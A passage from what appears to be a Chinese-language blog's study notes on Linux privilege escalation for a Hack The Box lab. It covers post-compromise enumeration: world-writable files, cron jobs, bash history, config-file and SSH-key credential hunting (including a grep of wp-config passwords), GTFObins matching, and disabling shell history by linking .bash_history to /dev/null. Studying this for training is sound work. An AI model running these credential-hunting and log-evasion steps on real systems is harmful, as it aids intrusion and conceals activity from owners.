2&gt;/dev/null/dmz-backups/tmp/tmp/VMwareDnD/tmp/.XIM-unix/tmp/.Test-unix/tmp/.X11-unix/tmp/systemd-private-8a2c51fcbad240d09578916b47b0bb17-systemd-timesyncd.service-TIecv0/tmp/tmp/.font-unix/tmp/.ICE-unix/proc/dev/mqueue/dev/shm/var/tmp/var/tmp/systemd-private-8a2c51fcbad240d09578916b47b0bb17-systemd-timesyncd.service-hm6Qdl/tmp/var/crash/run/lock</code></pre><blockquote><p>该命令用于在Linux系统中查找具有写权限的目录。下面是对该命令的解释：</p><ul><li><p><code>find</code>：查找命令。</p></li><li><p><code>/</code>：指定要在根目录下开始查找。</p></li><li><p><code>-path /proc -prune</code>：排除路径为<code>/proc</code>的目录。</p></li><li><p><code>-o</code>：逻辑运算符，表示或者。</p></li><li><p><code>-type d</code>：指定查找的对象类型为目录。</p></li><li><p><code>-perm -o+w</code>：指定查找的目录具有其他用户写权限。</p></li><li><p><code>2&gt;/dev/null</code>：将错误输出重定向到<code>/dev/null</code>，以忽略任何权限错误信息。</p></li><li><p>在查找具有写权限的目录时，可以使用 <code>-perm -o+w</code> 来指定条件。该选项的含义是：</p><ul><li><code>-perm</code>：用于指定文件和目录权限的匹配条件。</li><li><code>-o</code>：表示其他用户权限组。</li><li><code>+w</code>：表示具有写权限。</li></ul><p>因此，<code>-perm -o+w</code> 表示查找具有其他用户组可写权限的文件和目录。</p></li></ul></blockquote><p>可写文件：任何脚本或配置文件都是可写的吗？虽然更改配置文件可能具有极大的破坏性，但在某些情况下，轻微的修改可能会打开进一步的访问权限。此外，任何使用cron jobs以root身份运行的脚本都可以稍作修改以附加命令。</p><h4 id="Find-Writable-Files"><a href="#Find-Writable-Files" class="headerlink" title="Find Writable Files"></a>Find Writable Files</h4><pre><code class="shell-session">Tanin@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null/etc/cron.daily/backup/dmz-backups/backup.sh/proc/sys/fs/cgroup/memory/init.scope/cgroup.event_control&lt;SNIP&gt;/home/backupsvc/backup.sh&lt;SNIP&gt;</code></pre><h2 id="Gaining-Situational-Awareness"><a href="#Gaining-Situational-Awareness" class="headerlink" title="Gaining Situational Awareness"></a>Gaining Situational Awareness</h2><p>通常，我们需要运行一些基本命令来确定自己的方向：</p><ul><li><code>whoami</code> - what user are we running as</li><li><code>id</code> - what groups does our user belong to?</li><li><code>hostname</code> - what is the server named. can we gather anything from the naming convention?</li><li><code>ifconfig</code> or <code>ip -a</code> - what subnet did we land in, does the host have additional NICs in other subnets?</li><li><code>sudo -l</code> - can our user run anything with sudo (as another user as root) without needing a password? This can sometimes be the easiest win and we can do something like <code>sudo su</code> and drop right into a root shell.</li><li>&#x2F;etc&#x2F;os-release</li></ul><p>接下来，我们将检查当前用户的PATH，每当为任何可执行文件执行命令以匹配我们键入的名称时，Linux系统都会在其中查找，即，该系统上位于&#x2F;usr&#x2F;bin&#x2F;id的id。正如我们稍后在本模块中看到的，如果目标用户的PATH变量配置错误，我们可能可以利用它来提升权限。</p><pre><code class="shell-session">Tanin@htb[/htb]$ echo $PATH/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin</code></pre><p>我们还可以检查为当前用户设置的所有环境变量，我们可能会幸运地在其中找到一些敏感的东西，例如密码。</p><pre><code class="shell-session">Tanin@htb[/htb]$ envSHELL=/bin/bashPWD=/home/htb-studentLOGNAME=htb-studentXDG_SESSION_TYPE=ttyMOTD_SHOWN=pamHOME=/home/htb-studentLANG=en_US.UTF-8&lt;SNIP&gt;</code></pre><p>接下来让我们记下内核版本。我们可以进行一些搜索，看看目标是否正在运行一个易受攻击的内核（我们稍后将在模块中利用它），该内核具有一些已知的公共漏洞PoC。我们可以用几种方法来实现，另一种方法是&#x3D;&#x3D;cat&#x2F;proc&#x2F;version&#x3D;&#x3D;，但我们将使用uname-a命令。</p><pre><code class="shell-session">Tanin@htb[/htb]$ uname -aLinux nixlpe02 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</code></pre><p>接下来，我们可以收集一些关于主机本身的附加信息，例如CPU类型&#x2F;版本：</p><pre><code class="shell-session">Tanin@htb[/htb]$ lscpu Architecture:                    x86_64CPU op-mode(s):                  32-bit, 64-bitByte Order:                      Little EndianAddress sizes:                   43 bits physical, 48 bits virtualCPU(s):                          2On-line CPU(s) list:             0,1Thread(s) per core:              1Core(s) per socket:              2Socket(s):                       1NUMA node(s):                    1Vendor ID:                       AuthenticAMDCPU family:                      23Model:                           49Model name:                      AMD EPYC 7302P 16-Core ProcessorStepping:                        0CPU MHz:                         2994.375BogoMIPS:                        5988.75Hypervisor vendor:               VMware&lt;SNIP&gt;</code></pre><p>服务器上存在哪些登录shell？记下这些，并强调Tmux和Screen对我们都可用。</p><pre><code class="shell-session">Tanin@htb[/htb]$ cat /etc/shells# /etc/shells: valid login shells/bin/sh/bin/bash/usr/bin/bash/bin/rbash/usr/bin/rbash/bin/dash/usr/bin/dash/usr/bin/tmux/usr/bin/screen</code></pre><p>我们还应该检查是否有任何防御措施，我们可以列举有关它们的任何信息。需要查找的内容包括：</p><ul><li><a href="https://en.wikipedia.org/wiki/Exec_Shield">Exec Shield</a></li><li><a href="https://linux.die.net/man/8/iptables">iptables</a></li><li><a href="https://apparmor.net/">AppArmor</a></li><li><a href="https://www.redhat.com/en/topics/linux/what-is-selinux">SELinux</a></li><li><a href="https://github.com/fail2ban/fail2ban">Fail2ban</a></li><li><a href="https://www.snort.org/faq/what-is-snort">Snort</a></li><li><a href="https://wiki.ubuntu.com/UncomplicatedFirewall">Uncomplicated Firewall (ufw)</a></li></ul><p>通常情况下，我们没有特权列举这些保护的配置，但知道哪些配置（如果有的话）可以帮助我们避免在某些任务上浪费时间。 接下来，我们可以查看系统上的驱动器和任何共享。首先，我们可以使用lsblk命令枚举系统上块设备（硬盘、USB驱动器、光盘驱动器等）的信息。如果我们发现并可以装载额外的驱动器或未装载的文件系统，我们可能会发现可以用来提升特权的敏感文件、密码或备份。</p><pre><code class="shell-session">Tanin@htb[/htb]$ lsblkNAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTloop0                       7:0    0   55M  1 loop /snap/core18/1705loop1                       7:1    0   69M  1 loop /snap/lxd/14804loop2                       7:2    0   47M  1 loop /snap/snapd/16292loop3                       7:3    0  103M  1 loop /snap/lxd/23339loop4                       7:4    0   62M  1 loop /snap/core20/1587loop5                       7:5    0 55.6M  1 loop /snap/core18/2538sda                         8:0    0   20G  0 disk ├─sda1                      8:1    0    1M  0 part ├─sda2                      8:2    0    1G  0 part /boot└─sda3                      8:3    0   19G  0 part   └─ubuntu--vg-ubuntu--lv 253:0    0   18G  0 lvm  /sr0                        11:0    1  908M  0 rom </code></pre><p>命令lpstat可用于查找有关连接到系统的任何打印机的信息。如果有活动或排队的打印作业，我们是否可以访问某种敏感信息？<br>我们还应该检查已安装的驱动器和未安装的驱动器。我们可以安装一个死驱动器并访问敏感数据吗？通过在&#x2F;etc&#x2F;fstab中查找密码、用户名、凭据等常用词，我们能在fstab中为已安装的驱动器找到任何类型的凭据吗？</p><pre><code class="shell-session">Tanin@htb[/htb]$ cat /etc/fstab# /etc/fstab: static file system information.## Use &#39;blkid&#39; to print the universally unique identifier for a# device; this may be used with UUID= as a more robust way to name devices# that works even if disks are added and removed. See fstab(5).## &lt;file system&gt; &lt;mount point&gt;   &lt;type&gt;  &lt;options&gt;       &lt;dump&gt;  &lt;pass&gt;# / was on /dev/ubuntu-vg/ubuntu-lv during curtin installation/dev/disk/by-id/dm-uuid-LVM-BdLsBLE4CvzJUgtkugkof4S0dZG7gWR8HCNOlRdLWoXVOba2tYUMzHfFQAP9ajul / ext4 defaults 0 0# /boot was on /dev/sda2 during curtin installation/dev/disk/by-uuid/20b1770d-a233-4780-900e-7c99bc974346 /boot ext4 defaults 0 0</code></pre><p>键入route或netstat-rn查看路由表。在这里，我们可以看到通过哪个接口可以使用哪些其他网络。</p><pre><code class="shell-session">Tanin@htb[/htb]$ routeKernel IP routing tableDestination     Gateway         Genmask         Flags Metric Ref    Use Ifacedefault         _gateway        0.0.0.0         UG    0      0        0 ens19210.129.0.0      0.0.0.0         255.255.0.0     U     0      0        0 ens192</code></pre><p>在域环境中，如果主机配置为使用内部DNS，我们肯定要检查&#x2F;etc&#x2F;resolv.conf。我们可以将其作为查询Active Directory环境的起点。 我们还想检查arp表，看看目标一直在与哪些其他主机通信。</p><pre><code class="shell-session">Tanin@htb[/htb]$ arp -a_gateway (10.129.0.1) at 00:50:56:b9:b9:fc [ether] on ens192</code></pre><p>偶尔，我们会在&#x2F;etc&#x2F;passwd文件中直接看到密码散列。该文件对所有用户都是可读的，与&#x2F;etc&#x2F;shadow文件中的哈希一样，这些用户可能会受到离线密码破解攻击。这种配置虽然不常见，但有时可以在嵌入式设备和路由器上看到。</p><pre><code class="shell-session">Tanin@htb[/htb]$ cat /etc/passwd | cut -f1 -d:rootdaemonbinsys</code></pre><p>Linux系统中的每个用户都被分配到一个或多个特定的组，从而获得特殊权限。例如，如果我们有一个名为dev的文件夹仅供开发人员使用，则必须将用户分配到适当的组以访问该文件夹。有关可用组的信息可以在&#x2F;etc&#x2F;group文件中找到，该文件向我们显示了组名和分配的用户名。</p><h4 id="Existing-Groups"><a href="#Existing-Groups" class="headerlink" title="Existing Groups"></a>Existing Groups</h4><pre><code class="shell-session">Tanin@htb[/htb]$ cat /etc/grouproot:x:0:daemon:x:1:bin:x:2:sys:x:3:...</code></pre><p>&#x2F;etc&#x2F;group文件列出了系统上的所有组。然后，我们可以使用 <a href="https://man7.org/linux/man-pages/man1/getent.1.html">getent</a> 命令列出任何感兴趣的组的成员。</p><pre><code class="shell-session">Tanin@htb[/htb]$ getent group sudosudo:x:27:mrb3n</code></pre><h4 id="Mounted-File-Systems"><a href="#Mounted-File-Systems" class="headerlink" title="Mounted File Systems"></a>Mounted File Systems</h4><p>卸载文件系统后，系统将无法再访问该文件系统。这可能是由于各种原因造成的，例如删除磁盘或不再需要文件系统时。另一个原因可能是文件、脚本、文档和其他重要信息不能由标准用户装载和查看。因此，如果我们能够将权限扩展到根用户，我们就可以自己装载和读取这些文件系统。可以按如下方式查看未装载的文件系统：</p><pre><code class="shell-session">Tanin@htb[/htb]$ df -hFilesystem      Size  Used Avail Use% Mounted onudev            1,9G     0  1,9G   0% /devtmpfs           389M  1,8M  388M   1% /run/dev/sda5        20G  7,9G   11G  44% /</code></pre><h4 id="Unmounted-File-Systems"><a href="#Unmounted-File-Systems" class="headerlink" title="Unmounted File Systems"></a>Unmounted File Systems</h4><pre><code class="shell-session">Tanin@htb[/htb]$ cat /etc/fstab | grep -v &quot;#&quot; | column -tUUID=5bf16727-fcdf-4205-906c-0620aa4a058f  /          ext4  errors=remount-ro  0  1UUID=BE56-AAE0                             /boot/efi  vfat  umask=0077         0  1/swapfile                                  none       swap  sw                 0  0</code></pre><p>许多文件夹和文件在Linux系统中被隐藏，因此它们不明显，并且可以防止意外编辑。为什么这些文件和文件夹被隐藏起来，原因比迄今为止提到的要多得多。尽管如此，我们需要能够找到所有隐藏的文件和文件夹，因为它们通常包含敏感信息，即使我们拥有只读权限。</p><h4 id="All-Hidden-Files"><a href="#All-Hidden-Files" class="headerlink" title="All Hidden Files"></a>All Hidden Files</h4><pre><code class="shell-session">Tanin@htb[/htb]$ find / -type f -name &quot;.*&quot; -exec ls -l &#123;&#125; \; 2&gt;/dev/null | grep htb-student-rw-r--r-- 1 htb-student htb-student 3771 Nov 27 11:16 /home/htb-student/.bashrc-rw-rw-r-- 1 htb-student htb-student 180 Nov 27 11:36 /home/htb-student/.wget-hsts-rw------- 1 htb-student htb-student 387 Nov 27 14:02 /home/htb-student/.bash_history</code></pre><blockquote><ul><li><code>&#123;&#125;</code> 表示 <code>find</code> 命令的占位符，用于表示找到的文件。</li><li><code>\;</code> 是 <code>find</code> 命令的结束符号，表示命令结束。</li></ul><p>通过这个命令，<code>find</code> 命令将在当前目录或指定的目录下查找满足条件的文件，并将每个文件的详细信息传递给 <code>ls -l</code> 命令进行输出。</p><p>需要注意的是，这个命令在每找到一个文件时都会执行一次 <code>ls -l</code> 命令，可能会产生大量的输出。如果您只想查看文件的总体信息，可以使用 <code>ls -l</code> 命令来替代。</p></blockquote><p>此外，三个默认文件夹用于临时文件。这些文件夹对所有用户都可见，并且可以读取。此外，可以在那里找到临时日志或脚本输出。&#x2F;tmp和&#x2F;var&#x2F;tmp都用于临时存储数据。然而，关键的区别在于数据在这些文件系统中存储的时间。&#x2F;var&#x2F;tmp的数据保留时间要比&#x2F;tmp目录的数据保持时间长得多。默认情况下，存储在&#x2F;var&#x2F;tmp中的所有文件和数据最多保留30天。另一方面，在&#x2F;tmp中，数据会在十天后自动删除。 此外，当系统重新启动时，存储在&#x2F;tmp目录中的所有临时文件都会立即删除。因此，程序使用&#x2F;var&#x2F;tmp目录来存储在重新启动之间必须临时保存的数据。</p><h4 id="Temporary-Files"><a href="#Temporary-Files" class="headerlink" title="Temporary Files"></a>Temporary Files</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ls -l /tmp /var/tmp /dev/shm</code></pre><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><blockquote><p>Enumerate the Linux environment and look for interesting files that might contain sensitive data. Submit the flag as the answer.</p></blockquote><p>在查找时发现一个有趣的东西记录一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307151702324.png" alt="image-20230715170245465">他把历史记录的文件直接软连接到null中，这样就可以不记录我们的操作。</p><blockquote><p>该输出显示了一个名为 <code>.bash_history</code> 的符号链接文件。下面是对该输出的解释：</p><ul><li><code>lrwxrwxrwx</code>：表示该文件是一个符号链接（即软链接）。第一个字符 <code>l</code> 表示文件类型为符号链接。</li><li><code>1</code>：表示链接计数，即有多少个文件名链接到同一个 inode（索引节点）。</li><li><code>root</code>：表示文件的所有者是 root 用户。</li><li><code>root</code>：表示文件的所属组是 root 组。</li><li><code>9 Jun 14 14:38</code>：表示文件的最后修改时间为 6 月 14 日的 14:38。</li><li><code>.bash_history -&gt; /dev/null</code>：表示 <code>.bash_history</code> 是一个指向 <code>/dev/null</code> 的符号链接。</li></ul><p>符号链接（或软链接）是一种特殊的文件类型，它创建了一个指向另一个文件或目录的引用。在这种情况下，<code>.bash_history</code> 是一个指向 <code>/dev/null</code> 的符号链接。<code>/dev/null</code> 是一个特殊的设备文件，它被用于丢弃所有写入它的数据，即将数据发送到空虚。</p><p>这种设置可能意味着用户的 Bash 历史记录文件被重定向到 <code>/dev/null</code>，这意味着 Bash 历史记录中的所有命令都将被丢弃，不会被保留下来。</p></blockquote><blockquote><p>要创建符号链接（软链接），可以使用 <code>ln</code> 命令。<code>ln</code> 命令用于创建链接，它可以创建硬链接或符号链接。在这种情况下，我们想要创建一个符号链接。</p><p>下面是使用 <code>ln</code> 命令创建符号链接的语法：</p><pre><code class="shell">ln -s &lt;目标文件&gt; &lt;链接名称&gt;</code></pre><p>其中：</p><ul><li><code>&lt;目标文件&gt;</code> 是指向的目标文件或目录的路径。</li><li><code>&lt;链接名称&gt;</code> 是要创建的符号链接的名称和路径。</li></ul><p>例如，要创建一个名为 <code>.bash_history</code> 的符号链接指向 <code>/dev/null</code>，可以使用以下命令：</p><pre><code class="shell">ln -s /dev/null .bash_history</code></pre><p>执行此命令后，将在当前目录中创建一个名为 <code>.bash_history</code> 的符号链接，它将指向 <code>/dev/null</code>。这样，当您的系统尝试将 Bash 历史记录写入 <code>.bash_history</code> 文件时，数据实际上会被重定向到 <code>/dev/null</code>，即被丢弃。</p><p>请注意，在创建符号链接时，确保您具有适当的权限来访问目标文件或目录，并且在目标文件或目录存在的情况下才能成功创建链接。</p></blockquote><h1 id="Linux-Services-amp-Internals-Enumeration"><a href="#Linux-Services-amp-Internals-Enumeration" class="headerlink" title="Linux Services &amp; Internals Enumeration"></a>Linux Services &amp; Internals Enumeration</h1><h2 id="Internals"><a href="#Internals" class="headerlink" title="Internals"></a>Internals</h2><p>当我们谈论内部时，我们指的是内部配置和工作方式，包括为完成特定任务而设计的集成流程。因此，我们从我们的目标系统可以通信的接口开始。</p><h4 id="Network-Interfaces"><a href="#Network-Interfaces" class="headerlink" title="Network Interfaces"></a>Network Interfaces</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ip a</code></pre><p>&#x2F;etc&#x2F;hosts文件中有什么有趣的内容吗？</p><p>查看每个用户的上次登录时间也很有帮助，以了解用户通常何时登录系统以及登录频率。这可以让我们了解这个系统的使用范围，这可能会导致更多的错误配置或“混乱”的目录或命令历史记录。</p><h4 id="User’s-Last-Login"><a href="#User’s-Last-Login" class="headerlink" title="User’s Last Login"></a>User’s Last Login</h4><pre><code class="shell-session">Tanin@htb[/htb]$ lastlog</code></pre><p>此外，让我们看看目前是否有其他人与我们一起使用该系统。有几种方法可以做到这一点，例如who命令。finger命令将在某些Linux系统上显示此信息。我们可以看到cliff.moore用户已经和我们一起登录到了系统。</p><h4 id="Logged-In-Users"><a href="#Logged-In-Users" class="headerlink" title="Logged In Users"></a>Logged In Users</h4><pre><code class="shell-session">Tanin@htb[/htb]$ w 12:27:21 up 1 day, 16:55,  1 user,  load average: 0.00, 0.00, 0.00USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHATcliff.mo pts/0    10.10.14.16      Tue19   40:54m  0.02s  0.02s -bash</code></pre><p>检查用户的bash历史记录也很重要，因为他们可能会在命令行上将密码作为参数传递，使用git存储库，设置cron作业等等。查看用户所做的事情可以让您深入了解所登录的服务器类型，并提示权限提升路径。</p><h4 id="Command-History"><a href="#Command-History" class="headerlink" title="Command History"></a>Command History</h4><pre><code class="shell-session">Tanin@htb[/htb]$ history    1  id    2  cd /home/cliff.moore    3  exit    4  touch backup.sh    5  tail /var/log/apache2/error.log    6  ssh ec2-user@dmz02.inlanefreight.local    7  history</code></pre><p>有时我们还可以找到由脚本或程序创建的特殊历史文件。这可以在监视用户的某些活动并检查可疑活动的脚本中找到。</p><h4 id="Finding-History-Files"><a href="#Finding-History-Files" class="headerlink" title="Finding History Files"></a>Finding History Files</h4><pre><code class="shell-session">Tanin@htb[/htb]$ find / -type f \( -name *_hist -o -name *_history \) -exec ls -l &#123;&#125; \; 2&gt;/dev/null-rw------- 1 htb-student htb-student 387 Nov 27 14:02 /home/htb-student/.bash_history</code></pre><p>检查系统上的任何cron作业也是一个好主意。Linux系统上的Cron作业类似于Windows计划任务。它们通常用于执行维护和备份任务。结合其他错误配置（如相对路径或弱权限），它们可以在计划的cron作业运行时利用这些错误配置来提升权限。</p><h4 id="Cron"><a href="#Cron" class="headerlink" title="Cron"></a>Cron</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ls -la /etc/cron.daily/</code></pre><p>proc文件系统 <a href="https://man7.org/linux/man-pages/man5/proc.5.html">proc filesystem</a> （proc&#x2F;procfs）是Linux中的一个特定文件系统，它包含有关系统进程、硬件和其他系统信息的信息。它是访问进程信息的主要方式，可用于查看和修改内核设置。它是虚拟的，不作为真实的文件系统存在，而是由内核动态生成的。它可以用来查找系统信息，例如运行进程的状态、内核参数、系统内存和设备。它还设置某些系统参数，例如进程优先级、调度和内存分配。</p><pre><code class="shell-session">Tanin@htb[/htb]$ find /proc -name cmdline -exec cat &#123;&#125; \; 2&gt;/dev/null | tr &quot; &quot; &quot;\n&quot;...SNIP...startups/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitd/usr/lib/packagekit/packagekitdroot@10.129.14.200sshroot@10.129.14.200sshd:htb-student[priv]sshd:htb-student[priv]/usr/bin/ssh-agent-D-a/run/user/1000/keyring/.ssh/usr/bin/ssh-agent-D-a/run/user/1000/keyring/.sshsshd:htb-student@pts/2sshd:</code></pre><h2 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h2><p>如果是稍旧的Linux系统，我们可能会发现安装的软件包中至少有一个漏洞。然而，当前版本的Linux发行版也可能安装了可能存在此类漏洞的旧包或软件。因此，我们将看到一种方法来帮助我们检测潜在的危险包裹。要做到这一点，我们首先需要创建一个要使用的已安装包的列表。</p><h4 id="Installed-Packages"><a href="#Installed-Packages" class="headerlink" title="Installed Packages"></a>Installed Packages</h4><pre><code class="shell-session">Tanin@htb[/htb]$ apt list --installed | tr &quot;/&quot; &quot; &quot; | cut -d&quot; &quot; -f1,3 | sed &#39;s/[0-9]://g&#39; | tee -a installed_pkgs.listListing...                                                 accountsservice-ubuntu-schemas 0.0.7+17.10.20170922-0ubuntu1                                                          accountsservice 0.6.55-0ubuntu12~20.04.5                   acl 2.2.53-6                                               acpi-support 0.143                                         acpid 2.0.32-1ubuntu1                                      adduser 3.118ubuntu2                                       adwaita-icon-theme 3.36.1-2ubuntu0.20.04.2                 alsa-base 1.0.25+dfsg-0ubuntu5                             alsa-topology-conf 1.2.2-1                                                                                            alsa-ucm-conf 1.2.2-1ubuntu0.13                            alsa-utils 1.2.2-1ubuntu2.1                                                                                           amd64-microcode 3.20191218.1ubuntu1anacron 2.3-29apg 2.2.3.dfsg.1-5app-install-data-partner 19.04apparmor 2.13.3-7ubuntu5.1apport-gtk 2.20.11-0ubuntu27.24apport-symptoms 0.23apport 2.20.11-0ubuntu27.24appstream 0.12.10-2apt-config-icons-hidpi 0.12.10-2apt-config-icons 0.12.10-2apt-utils 2.0.9...SNIP...</code></pre><p>检查系统上安装的sudo版本是否容易受到任何遗留或最近的漏洞攻击也是一个好主意。</p><h4 id="Sudo-Version"><a href="#Sudo-Version" class="headerlink" title="Sudo Version"></a>Sudo Version</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo -V</code></pre><p>偶尔也会发生这样的情况：系统上没有安装直接包，而是以二进制文件的形式编译程序。这些不需要安装，并且可以由系统本身直接执行。</p><h4 id="Binaries"><a href="#Binaries" class="headerlink" title="Binaries"></a>Binaries</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ls -l /bin /usr/bin/ /usr/sbin/lrwxrwxrwx 1 root root     7 Oct 27 11:14 /bin -&gt; usr/bin/usr/bin/:total 175160-rwxr-xr-x 1 root root       31248 May 19  2020  aa-enabled-rwxr-xr-x 1 root root       35344 May 19  2020  aa-exec-rwxr-xr-x 1 root root       22912 Apr 14  2021  aconnect-rwxr-xr-x 1 root root       19016 Nov 28  2019  acpi_listen-rwxr-xr-x 1 root root        7415 Oct 26  2021  add-apt-repository-rwxr-xr-x 1 root root       30952 Feb  7  2022  addpartlrwxrwxrwx 1 root root          26 Oct 20  2021  addr2line -&gt; x86_64-linux-gnu-addr2line...SNIP...</code></pre><p><a href="https://gtfobins.github.io/">GTFObins</a>提供了一个优秀的平台，其中包括一系列二进制文件，这些二进制文件可能被用来提升我们在目标系统上的权限。对于下一个oneliner，我们可以将现有的二进制文件与GTFObins中的二进制文件进行比较，以了解我们稍后应该研究哪些二进制文件。</p><pre><code class="shell-session">Tanin@htb[/htb]$ for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d&quot; &quot; -f1 | sed &#39;/^[[:space:]]*$/d&#39;);do if grep -q &quot;$i&quot; installed_pkgs.list;then echo &quot;Check GTFO for: $i&quot;;fi;doneCheck GTFO for: ab                                         Check GTFO for: apt                                        Check GTFO for: ar                                         Check GTFO for: as         Check GTFO for: ash                                        Check GTFO for: aspell                                     Check GTFO for: at     Check GTFO for: awk      Check GTFO for: bash                                       Check GTFO for: bridgeCheck GTFO for: busyboxCheck GTFO for: bzip2Check GTFO for: catCheck GTFO for: commCheck GTFO for: cpCheck GTFO for: cpioCheck GTFO for: cupsfilterCheck GTFO for: curlCheck GTFO for: dashCheck GTFO for: dateCheck GTFO for: ddCheck GTFO for: diff</code></pre><p>我们可以在基于Linux的操作系统上使用诊断工具strace来跟踪和分析系统调用和信号处理。它使我们能够遵循程序的流程，了解程序如何访问系统资源、处理信号以及从操作系统接收和发送数据。此外，我们还可以使用该工具来监控与安全相关的活动，并识别潜在的攻击载体，例如使用密码或令牌向远程主机发出的特定请求。 strace的输出可以写入一个文件以供以后分析，它提供了丰富的选项，可以详细监控程序的行为。</p><pre><code class="shell-session">Tanin@htb[/htb]$ strace ping -c1 10.129.112.20</code></pre><p>如果管理员保持Linux操作系统上几乎所有的配置文件不变，则用户可以读取这些文件。这些配置文件通常可以揭示服务是如何设置和配置的，以便更好地了解我们如何将其用于我们的目的。此外，这些文件可能包含敏感信息，例如我们看不到的文件夹中文件的密钥和路径。但是，如果该文件对每个人都具有读取权限，即使我们没有读取文件夹的权限，我们仍然可以读取该文件。</p><pre><code class="shell-session">Tanin@htb[/htb]$ find / -type f \( -name *.conf -o -name *.config \) -exec ls -l &#123;&#125; \; 2&gt;/dev/null-rw-r--r-- 1 root root 448 Nov 28 12:31 /run/tmpfiles.d/static-nodes.conf-rw-r--r-- 1 root root 71 Nov 28 12:31 /run/NetworkManager/resolv.conf-rw-r--r-- 1 root root 72 Nov 28 12:31 /run/NetworkManager/no-stub-resolv.conf-rw-r--r-- 1 root root 0 Nov 28 12:37 /run/NetworkManager/conf.d/10-globally-managed-devices.conf-rw-r--r-- 1 systemd-resolve systemd-resolve 736 Nov 28 12:31 /run/systemd/resolve/stub-resolv.conf-rw-r--r-- 1 systemd-resolve systemd-resolve 607 Nov 28 12:31 /run/systemd/resolve/resolv.conf...SNIP...</code></pre><p>脚本与配置文件类似。管理员往往懒惰，对网络安全深信不疑，忽视了系统的内部安全。在某些情况下，这些脚本具有错误的特权，我们稍后将对此进行处理，但即使没有这些特权，内容也非常重要。因为通过它们，我们可以发现对我们非常有用的内部和个人过程。</p><h4 id="Scripts"><a href="#Scripts" class="headerlink" title="Scripts"></a>Scripts</h4><pre><code class="shell-session">Tanin@htb[/htb]$ find / -type f -name &quot;*.sh&quot; 2&gt;/dev/null | grep -v &quot;src\|snap\|share&quot;/home/htb-student/automation.sh/etc/wpa_supplicant/action_wpa.sh/etc/wpa_supplicant/ifupdown.sh/etc/wpa_supplicant/functions.sh/etc/init.d/keyboard-setup.sh/etc/init.d/console-setup.sh/etc/init.d/hwclock.sh...SNIP...</code></pre><p>此外，如果我们查看进程列表，它可以为我们提供有关哪些脚本或二进制文件正在使用以及由哪个用户使用的信息。因此，例如，如果它是管理员在其路径中创建的脚本，并且其权限没有受到限制，我们可以在不进入根目录的情况下运行它。</p><h4 id="Running-Services-by-User"><a href="#Running-Services-by-User" class="headerlink" title="Running Services by User"></a>Running Services by User</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ps aux | grep root...SNIP...</code></pre><h1 id="Credential-Hunting"><a href="#Credential-Hunting" class="headerlink" title="Credential Hunting"></a>Credential Hunting</h1><p>枚举系统时，记下任何凭据都很重要。这些可以在配置文件（.conf、.config、.xml等）、shell脚本、用户的bash历史文件、备份（.bak）文件、数据库文件甚至文本文件中找到。凭据可能有助于升级到其他用户，甚至root用户，访问环境中的数据库和其他系统。 &#x2F;var&#x2F;目录通常包含主机上运行的任何web服务器的web根目录。web根可以包含数据库凭证或可以用于进一步访问的其他类型的凭证。一个常见的例子是WordPress配置文件中的MySQL数据库凭据：</p><pre><code class="shell-session">htb_student@NIX02:~$ cat wp-config.php | grep &#39;DB_USER\|DB_PASSWORD&#39;define( &#39;DB_USER&#39;, &#39;wordpressuser&#39; );define( &#39;DB_PASSWORD&#39;, &#39;WPadmin123!&#39; );</code></pre><p>spool 或 mail 目录（如果可以访问）也可能包含有价值的信息甚至凭据。通常可以在web根目录中找到存储在文件中的凭据（即MySQL连接字符串、WordPress配置文件）。</p><pre><code class="shell-session">htb_student@NIX02:~$  find / ! -path &quot;*/proc/*&quot; -iname &quot;*config*&quot; -type f 2&gt;/dev/null</code></pre><p><code>-iname &quot;*config*&quot;</code>：表示忽略文件名大小写，查找包含 “config” 的文件。</p><h2 id="SSH-Keys"><a href="#SSH-Keys" class="headerlink" title="SSH Keys"></a>SSH Keys</h2><p>在系统中搜索可访问的SSH私钥也很有用。我们可能会为另一个更有特权的用户找到一个私钥，我们可以使用该私钥以额外的特权连接回盒子。我们有时还可能找到可以用于访问环境中其他主机的SSH密钥。每当找到SSH密钥时，请检查known_hosts文件以查找目标。此文件包含用户过去连接过的所有主机的公钥列表，可能有助于横向移动或在远程主机上查找可用于对我们的目标执行权限提升的数据。</p><pre><code class="shell-session">htb_student@NIX02:~$  ls ~/.sshid_rsa  id_rsa.pub  known_hosts</code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Environment-Enumeration&quot;&gt;&lt;a href=&quot;#Environment-Enumeration&quot; class=&quot;headerlink&quot; title=&quot;Environment Enumeration&quot;&gt;&lt;/a&gt;Environment Enumeration&lt;/h1&gt;&lt;p&gt;Linux系统上的根帐户提供对操作系统的完全管理级别访问。在评估过程中，您可能会在Linux主机上获得一个低特权shell，并且需要向根帐户执行权限提升。完全损害主机将使我们能够捕获流量并访问敏感文件，这些文件可能用于在环境中进一步访问。此外，如果Linux计算机已加入域，我们可以获得NTLM哈希并开始枚举和攻击Active Directory。&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>NTA</title>
    <link href="https://taninluv.github.io/2023/07/15/NTA/"/>
    <id>https://taninluv.github.io/2023/07/15/NTA/</id>
    <published>2023-07-15T04:07:33.000Z</published>
    <updated>2023-07-15T07:00:50.371Z</updated>
    
